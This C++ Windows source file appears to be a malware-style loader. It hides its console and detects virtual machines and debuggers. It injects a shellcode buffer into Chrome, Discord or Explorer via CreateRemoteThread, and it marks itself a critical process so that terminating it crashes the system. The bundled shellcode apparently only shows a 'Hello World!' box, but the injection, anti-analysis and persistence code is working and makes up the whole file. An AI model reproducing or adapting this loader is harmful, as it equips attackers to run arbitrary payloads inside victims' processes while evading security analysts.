#define _CRT_SECURE_NO_WARNINGS
#define _CRT_NONSTDC_NO_DEPRECATE
#define WIN32_LEAN_AND_MEAN
#include"AntiDBG.h"
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <TlHelp32.h>
#include <iostream>
#include <fstream>
#include <comdef.h>
#include <psapi.h>
#include <thread>
#include <tchar.h>
#pragma comment( lib, "shlwapi.lib")

using namespace std;

void pEntry(void);

void RedirectFlow2()
{
	__try
	{
		__asm int 3;
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		pEntry();
	}
}

void RedirectFlow1()
{
	__try
	{
		__asm int 3;
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		RedirectFlow2();
	}
}

void RecheckSuspiciousMods(DWORD processID)
{
	HMODULE hMods[1024];
	HANDLE hProcess;
	DWORD cbNeeded;
	static int suspiciousMods;
	unsigned int i;

	i = 0;
	hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
		PROCESS_VM_READ,
		FALSE, processID);
	if (NULL == hProcess)
		return;

	if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded))
	{
		for (i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
		{
			TCHAR szModName[MAX_PATH];
			if (GetModuleBaseName(hProcess, hMods[i], szModName, sizeof(szModName) / sizeof(TCHAR)))
			{
				if (!_stricmp("vboxdisp.dll", (const char*)szModName))
					suspiciousMods++;
				if (!_stricmp("vboxhook.dll", (const char*)szModName))
					suspiciousMods++;
				if (!_stricmp("vboxmrxnp.dll", (const char*)szModName))
					suspiciousMods++;
				if (!_stricmp("vboxogl.dll", (const char*)szModName))
					suspiciousMods++;
				if (!_stricmp("vboxoglcrutil.dll", (const char*)szModName))
					suspiciousMods++;
				if (!_stricmp("vboxoglpackspu.dll", (const char*)szModName))
					suspiciousMods++;
				if (!_stricmp("vboxoglerrorspu.dll", (const char*)szModName))
					suspiciousMods++;
				if (!_stricmp("vboxoglfeedbackspu.dll", (const char*)szModName))
					suspiciousMods++;
				if (!_stricmp("vboxoglarrayspu.dll", (const char*)szModName))
					suspiciousMods++;
			}
		}
	}
	if (suspiciousMods > 0)
	{
		CloseHandle(hProcess);
		exit(EXIT_FAILURE);
	}
	CloseHandle(hProcess);
}

void EnThread()
{
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap != INVALID_HANDLE_VALUE)
	{
		PROCESSENTRY32 pE;
		pE.dwSize = sizeof(pE);

		if (Process32First(hSnap, &pE))
		{
			do
			{
				RecheckSuspiciousMods(pE.th32ProcessID);
			} while (Process32Next(hSnap, &pE));
		}
	}
	CloseHandle(hSnap);
}
DWORD GetPID(const char* pn)
{
	DWORD procId = 0;
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hSnap != INVALID_HANDLE_VALUE)
	{
		PROCESSENTRY32 pE;
		pE.dwSize = sizeof(pE);

		if (Process32First(hSnap, &pE))
		{
			if (!pE.th32ProcessID)
				Process32Next(hSnap, &pE);
			do
			{
				_bstr_t b(pE.szExeFile);
				const char* c = b;
				if (!_stricmp(c, pn))
				{
					procId = pE.th32ProcessID;
					break;
				}
			} while (Process32Next(hSnap, &pE));
		}
	}
	CloseHandle(hSnap);
	return procId;
}

bool IsExist(const TCHAR* fileName)
{
	DWORD       fileAttr;

	fileAttr = GetFileAttributes(fileName);
	if (GetLastError() == ERROR_FILE_NOT_FOUND)
		return false;
	return true;
}

void antiVm()
{
	int i = 0;
	const char* arr[] = { "vmtoolsd.exe","vmwaretray.exe","vmwareuser.exe" ,"VGAuthService.exe" ,"vmacthlp.exe" };
	for (i = 0; i < 5; i++)
	{
		if (GetPID(arr[i]))
			exit(EXIT_FAILURE);
	}
}

void antiVr() {
	if  (IsExist(L"C:\\windows\\System32\\vboxoglpackspu.dll"))
		exit(EXIT_FAILURE);
	else if (IsExist(L"C:\\windows\\System32\\Drivers\\VBoxSF.sys")) exit(EXIT_FAILURE);
	else if (IsExist(L"C:\\windows\\System32\\Drivers\\VBoxVideo.sys")) exit(EXIT_FAILURE);
	else if (IsExist(L"C:\\windows\\System32\\vboxoglpassthroughspu.dll")) exit(EXIT_FAILURE);
	else if (IsExist(L"C:\\windows\\System32\\vboxdisp.dll")) exit(EXIT_FAILURE);
	else if (IsExist(L"C:\\windows\\System32\\vboxhook.dll")) exit(EXIT_FAILURE);
	else if (IsExist(L"C:\\windows\\System32\\vboxmrxnp.dll")) exit(EXIT_FAILURE);
	else if (IsExist(L"C:\\windows\\System32\\vboxogl.dll")) exit(EXIT_FAILURE);
	else if (IsExist(L"C:\\windows\\System32\\vboxoglcrutil.dll")) exit(EXIT_FAILURE);
	else if (IsExist(L"C:\\windows\\System32\\Drivers\\VBoxGuest.sys")) exit(EXIT_FAILURE);
	else if (IsExist(L"C:\\windows\\System32\\vboxoglerrorspu.dll")) exit(EXIT_FAILURE);
	else if (IsExist(L"C:\\windows\\System32\\vboxoglfeedbackspu.dll")) exit(EXIT_FAILURE);
	else if (IsExist(L"C:\\windows\\System32\\Drivers\\VBoxMouse.sys")) exit(EXIT_FAILURE);
	else if (IsExist(L"C:\\windows\\System32\\vboxoglarrayspu.dll")) exit(EXIT_FAILURE);
}
int ShellCodeInjector(const char* pn)
{
	BOOL wp = 0;
	unsigned char ExecBuffer[] =
		"\x33\xc9\x64\x8b\x49\x30\x8b\x49\x0c\x8b\x49\x1c"
		"\x8b\x59\x08\x8b\x41\x20\x8b\x09\x80\x78\x0c\x33"
		"\x75\xf2\x8b\xeb\x03\x6d\x3c\x8b\x6d\x78\x03\xeb"
		"\x8b\x45\x20\x03\xc3\x33\xd2\x8b\x34\x90\x03\xf3"
		"\x42\x81\x3e\x47\x65\x74\x50\x75\xf2\x81\x7e\x04"
		"\x72\x6f\x63\x41\x75\xe9\x8b\x75\x24\x03\xf3\x66"
		"\x8b\x14\x56\x8b\x75\x1c\x03\xf3\x8b\x74\x96\xfc"
		"\x03\xf3\x33\xff\x57\x68\x61\x72\x79\x41\x68\x4c"
		"\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff\xd6"
		"\x33\xc9\x57\x66\xb9\x33\x32\x51\x68\x75\x73\x65"
		"\x72\x54\xff\xd0\x57\x68\x6f\x78\x41\x01\xfe\x4c"
		"\x24\x03\x68\x61\x67\x65\x42\x68\x4d\x65\x73\x73"
		"\x54\x50\xff\xd6\x57\x68\x72\x6c\x64\x21\x68\x6f"
		"\x20\x57\x6f\x68\x48\x65\x6c\x6c\x8b\xcc\x57\x57"
		"\x51\x57\xff\xd0\x57\x68\x65\x73\x73\x01\xfe\x4c"
		"\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74"
		"\x54\x53\xff\xd6\x57\xff\xd0";

	HANDLE hw = OpenProcess(PROCESS_ALL_ACCESS, 0, GetPID(pn));
	if (!hw)
		return -1;
	void* base = VirtualAllocEx(hw, NULL, sizeof(ExecBuffer), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!base)
		return -1;
	if (!WriteProcessMemory(hw, base, ExecBuffer, sizeof(ExecBuffer), NULL))
		return -1;
	HANDLE thread = CreateRemoteThread(hw, NULL, NULL, (LPTHREAD_START_ROUTINE)base, NULL, 0, 0);
	if (!thread)
		return -1;
	return 0;
}

typedef long(WINAPI* RtlSetProcessIsCritical)(
	IN BOOLEAN NewSettings,
	OUT BOOLEAN OldSettings,
	IN BOOLEAN CriticalStop
	);

BOOL SetPrivilege(BOOL bEnablePrivilege);

void Skinjbir() {
	RtlSetProcessIsCritical CallAPI;
	CallAPI = (RtlSetProcessIsCritical)GetProcAddress(LoadLibraryA("NTDLL.dll"), "RtlSetProcessIsCritical");

	if (SetPrivilege(TRUE) && CallAPI != NULL) {
		CallAPI(TRUE, FALSE, FALSE);
	}
	system("pause");
}

BOOL SetPrivilege(BOOL bEnablePrivilege) {
	HANDLE Proc, hTocken;
	Proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
	if (!OpenProcessToken(Proc, TOKEN_ALL_ACCESS, &hTocken)) return false;

	TOKEN_PRIVILEGES tp;
	LUID luid;
	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))  return  FALSE;
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	if (!AdjustTokenPrivileges(hTocken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
		return FALSE;

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) return FALSE;
	return TRUE;

}

void  checker()
{
    while (0b00000001)
    {
		Sleep(7500);
		// -------------------------------------------------------------------
		// -- Memory Checks --------------------------------------------------
		// -------------------------------------------------------------------
		adbg_IsDebuggerPresent();
		adbg_BeingDebuggedPEB();
		adbg_NtGlobalFlagPEB();
		adbg_CheckRemoteDebuggerPresent();
		adbg_NtQueryInformationProcess();
		adbg_CheckWindowClassName();
		adbg_CheckWindowName();
		adbg_ProcessFileName();
		adbg_NtSetInformationThread();
		// -------------------------------------------------------------------
		// -- CPU Checks -----------------------------------------------------
		// -------------------------------------------------------------------
		adbg_HardwareDebugRegisters();
		//adbg_MovSS(); // (Not recommended ) uncommenting this function will cause the program to crash due to an issue in ESP register
		// -------------------------------------------------------------------
		// -- Timing Checks --------------------------------------------------
		// -------------------------------------------------------------------
		adbg_RDTSC();
		adbg_QueryPerformanceCounter();
		adbg_GetTickCount();
		 //-------------------------------------------------------------------
		 //-- Exception Checks -----------------------------------------------
		 //-------------------------------------------------------------------
		adbg_CloseHandleException();
		adbg_SingleStepException();
		adbg_Int3();
		adbg_Int2D();
		adbg_PrefixHop();
		// -------------------------------------------------------------------
		// -- Other ----------------------------------------------------------
		// -------------------------------------------------------------------
		adbg_CrashOllyDbg();
    }
}

void pEntry(void)
{
	antiVm();
	antiVr();
	EnThread();
	std::thread check(checker);
	std::thread skinjbire(Skinjbir);
	if (ShellCodeInjector("chrome.exe"))
		(ShellCodeInjector("discord.exe")) ? MessageBoxA(NULL, "Error while injecting shellcode", "alert !", MB_OK | MB_ICONQUESTION) : ShellCodeInjector("explorer.exe");
	skinjbire.join();
	check.join();
}
int wmain()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	RedirectFlow1();
	return 0;
}